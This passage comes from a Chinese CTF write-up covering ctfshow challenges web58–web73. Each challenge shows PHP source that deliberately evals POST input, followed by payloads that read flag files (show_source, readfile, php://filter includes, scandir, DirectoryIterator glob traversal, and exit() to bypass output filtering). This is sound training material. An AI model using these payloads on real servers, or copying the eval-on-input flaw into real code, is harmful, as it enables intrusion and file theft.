class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    看着挺简单，直接试 system 函数，发现被禁用了</p><p>​    然后使用读取文件的方式，这里没有禁用文件读取</p><p><strong>实验：</strong></p><p>​    <strong>方法一：</strong></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-comment">//提高亮度函数</span><br>c=show_source(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>c=highlight_file(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-comment">//读取文件</span><br>c=echo file_get_contents(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>c=readfile(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>c=var_dump(<span class="hljs-keyword">file</span>(<span class="hljs-string">&quot;flag.php&quot;</span>));<br>c=print_r(<span class="hljs-keyword">file</span>(<span class="hljs-string">&quot;flag.php&quot;</span>));<br>c=$a=<span class="hljs-keyword">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span>(!<span class="hljs-keyword">feof</span>($a))&#123;$line = fgets($a);echo $line;&#125;<br></code></pre></td></tr></table></figure><p>​    还有个方法二会在 <strong>web62</strong> 中介绍</p><p><strong>.flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/58-1.jpg"></p><h2 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Lazzaro</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    这道题的源码没变。但是引用的函数肯定试越来越多的</p><p>​    这道题可以直接使用 <strong>include</strong> 函数，然后进行文件读取</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">?a=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br><span class="hljs-regexp">//</span> post中<br>c=include(<span class="hljs-variable">$_GET</span>[a]);<br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/59-1.jpg"></p><p>​    也可以继续使用上一题的方法</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-comment">//提亮函数</span><br>c=show_source(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>c=highlight_file(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-comment">// 读取文件</span><br>c=var_dump(<span class="hljs-keyword">file</span>(<span class="hljs-string">&quot;flag.php&quot;</span>));<br>c=print_r(<span class="hljs-keyword">file</span>(<span class="hljs-string">&quot;flag.php&quot;</span>));<br>c=$a=<span class="hljs-keyword">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span> (!<span class="hljs-keyword">feof</span>($a)) &#123;$line = fgets($a);echo $line;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/59-2.jpg"></p><h2 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Lazzaro</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    源码没变，但是引用的函数过了，之前的方法也只有两个可以继续使用，直接行payload</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">//提亮函数<br><span class="hljs-attribute">c</span>=show_source(<span class="hljs-string">&quot;flag.php&quot;</span>)<span class="hljs-comment">;</span><br><span class="hljs-attribute">c</span>=highlight_file(<span class="hljs-string">&quot;flag.php&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>​    也可以使用 <strong>include</strong> 函数，然后进行文件读取</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">?a=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br><span class="hljs-regexp">//</span> post：<br>c=include(<span class="hljs-variable">$_GET</span>[a]);<br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/60-1.jpg"></p><h2 id="web61"><a href="#web61" class="headerlink" title="web61"></a>web61</h2><p><strong>使用上一题的方法</strong></p><h2 id="web62"><a href="#web62" class="headerlink" title="web62"></a>web62</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Lazzaro</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    源码一样，可以使用之前的方法；这里使用一个在 <strong>web40</strong> 中使用的方法</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">c</span>=var_dump(scandir(<span class="hljs-string">&#x27;/&#x27;</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>扫描当前目录</p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/62-1.jpg"></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">c</span>=<span class="hljs-function"><span class="hljs-title">highlight_file</span>(<span class="hljs-title">next</span>(<span class="hljs-title">array_reverse</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">pos</span>(<span class="hljs-title">localeconv</span>())))));</span><br><span class="hljs-function"><span class="hljs-variable">c</span>=<span class="hljs-title">show_source</span>(<span class="hljs-title">array_rand</span>(<span class="hljs-title">array_flip</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">pos</span>(<span class="hljs-title">localeconv</span>())))));</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/62-2.jpg"></p><h2 id="web63"><a href="#web63" class="headerlink" title="web63"></a>web63</h2><p>​    <strong>同上</strong></p><h2 id="web64"><a href="#web64" class="headerlink" title="web64"></a>web64</h2><p>​    <strong>同上</strong></p><h2 id="web65"><a href="#web65" class="headerlink" title="web65"></a>web65</h2><p>​    <strong>同上</strong></p><h2 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Lazzaro</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    源码还是那个源码，继续使用之前的方法</p><p><strong>实验：</strong></p><p>​    使用 <strong>show_source()</strong> 发现被禁用了</p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/66-1.jpg"></p><p>​    继续使用高亮函数(highlight_file)查看，发现 flag 不在这</p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/66-2.jpg"></p><p>​    下面直接查看根目录</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">c</span>=print_r(scandir(<span class="hljs-string">&quot;/&quot;</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>发现了 <strong>flag.txt</strong> 文件</p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/66-3.jpg"></p><p>查看 flag.txt 文件</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">c</span>=highlight_file(<span class="hljs-string">&quot;/flag.txt&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/66-4.jpg"></p><h2 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Lazzaro</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    源码还是那个源码，解题方法也和上题相似</p><p><strong>实验：</strong></p><p>​    直接显示 flag 还是没有东西，所以还得查看目录寻找flag</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">POST:<br>c=<span class="hljs-built_in">print_r</span>(<span class="hljs-built_in">scandir</span>(<span class="hljs-string">&quot;/&quot;</span>));<br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/67-1.jpg"></p><p>​    发现 print_r 被禁了，可以使用 var_dump</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">c</span>=var_dump(scandir(<span class="hljs-string">&quot;/&quot;</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/67-2.jpg"></p><p>找到 flag.txt 文件，现在就是访问</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">c</span>=highlight_file(<span class="hljs-string">&quot;/flag.txt&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p> <img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/67-3.jpg"></p><h2 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h2><p>源码：</p><p>​    <strong>好吧，没源码，这题无法显示源码,应该是显示的函数被禁用了</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/68-1.jpg"></p><p><strong>分析:</strong></p><p>​    除了不显示源码外，我们继续尝试用上一题的方法</p><p><strong>实验：</strong></p><p>​    首先查看目录</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">c</span>=var_dump(scandir(<span class="hljs-string">&quot;/&quot;</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/68-2.jpg"></p><p>​    查看到 flag.txt ,现在就是访问了</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">c</span>=highlight_file(<span class="hljs-string">&quot;/flag.txt&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/68-3.jpg"></p><p>​    也该想到这函数被禁用了，毕竟源码都不能显示</p><p>​    查看官方给出的提示，发现使用 ”include“</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">c</span>=include(<span class="hljs-string">&quot;/flag.txt&quot;</span>)<span class="hljs-comment">;</span><br><span class="hljs-attr">c</span>=require_once(<span class="hljs-string">&quot;/flag.txt&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/68-4.jpg"></p><h2 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h2><p>​    <strong>同web68</strong></p><h2 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h2><p>​    <strong>同web68</strong></p><h2 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h2><p>附件中给出的源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Lazzaro</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$s</span> = ob_get_contents();<br>        ob_end_clean();<br>        <span class="hljs-keyword">echo</span> preg_replace(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br>你要上天吗？<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> ob_get_contentx() 返回输出缓冲区的内容<br><span class="hljs-regexp">//</span> ob_start() 打开输出控制缓冲<br><span class="hljs-regexp">//</span> ob_end_clean() 清空（擦除）缓冲区并关闭输出缓冲<br><span class="hljs-regexp">//</span> 把 数字字母 都替换为了 <span class="hljs-string">&#x27;?&#x27;</span><br></code></pre></td></tr></table></figure><p>此题首先 执行 : eval($c),将获取到了$c执行一遍，然后 $s = bo_get_contents();将$c执行的内容由缓存读取到了变量 $s,接下来的 preg_replace()会将缓存中的所有内容替换为‘?’:因此我们将会看到如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">c</span>=var_export(scandir(<span class="hljs-string">&quot;/&quot;</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/71-1.jpg"></p><p>扫描目录出来的内容都变成了 <strong>?????? and 你要上天吗? ，</strong>因此为了不让 ? 执行，可以在eval($c)执行完毕后将整个php程序给结束不再执行后面的语句，就可以实现绕过字母数字的替换；</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">c=var_export(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));die();<br>c=var_export(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));<span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/71-2.jpg"></p><p>如图找到了 flag.txt 和上面几道题的位置一样:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">c=include(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<span class="hljs-keyword">exit</span>();<br>c=include(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);die();<br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/71-3.jpg"></p><h2 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h2><p>​    <strong>不太会</strong></p><h2 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h2><p><strong>分析：</strong></p><p>​    根据提示，可以利用 glob:///* 扫描根目录下文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)<br>&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;__toString().<span class="hljs-string">&#x27; &#x27;</span>);<br>&#125;<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">// 前面的<span class="hljs-meta">?&gt;</span>用来闭合<span class="hljs-meta">&lt;?</span></span><br><span class="hljs-comment">// php使用glob遍历文件夹</span><br></code></pre></td></tr></table></figure><p>​    这个方法采用了数组遍历，输出根目录下的所有的文件</p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/73-1.jpg"></p><p>​    查看到 flag 在 flagc.txt 文件中</p><p>​    payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br>?c=include(<span class="hljs-string">&quot;/flagc.txt&quot;</span>);<span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/73-2.jpg"></p><h2 id="web73-1"><a href="#web73-1" class="headerlink" title="web73"></a>web73</h2><p>​    <strong>方法同上</strong></p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php特性</title>
    <link href="/2021/11/11/php%E7%89%B9%E6%80%A7/"/>
    <url>/2021/11/11/php%E7%89%B9%E6%80%A7/</url>
    
